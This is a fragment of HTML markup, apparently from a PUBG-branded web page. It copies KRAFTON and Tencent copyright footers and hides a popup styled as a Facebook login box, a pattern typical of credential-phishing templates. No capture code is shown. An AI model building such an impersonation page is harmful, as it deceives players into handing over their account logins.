...
<div class="footer-txt">&copy; 2021 KRAFTON, Inc. All rights reserved.</div>
<div class="footer-txt">&copy; 2018-2021 Tencent. All rights reserved.</div>
<div class="footer-txt">Privacy Policy | Tencent Games User Agreement</div>
</div> <!--- footer --->
</div> <!--- container --->
...
<br>
<br>
<button type="button" class="btn-anjir" onmousedown="buka.play()" onclick="closepopup()">Back</button>
</div>
</div>
...
<div class="popup-login login-facebook animated fadeIn" style="display: none;">
	<div class="popup-box-login-fb">
		...
		<div class="copyright">Facebook © 2021</div>
	</div>
</div>
